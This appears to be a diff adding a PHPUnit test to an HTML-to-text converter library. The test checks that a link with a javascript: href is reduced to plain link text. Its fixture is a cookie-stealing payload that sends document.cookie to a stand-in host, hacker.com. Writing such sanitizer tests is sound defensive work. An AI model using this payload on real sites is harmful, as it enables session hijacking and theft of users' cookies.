@@ -124,4 +124,14 @@ EOT;
 
         $this->assertEquals($expected, $html2text->getText());
     }
+		
+    public function testJavascriptSanitizing()
+    {
+        $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
+        $expected = 'Link text';
+
+        $html2text = new Html2Text($html, array('do_links' => 'inline'));
+
+        $this->assertEquals($expected, $html2text->getText());
+    }
 }
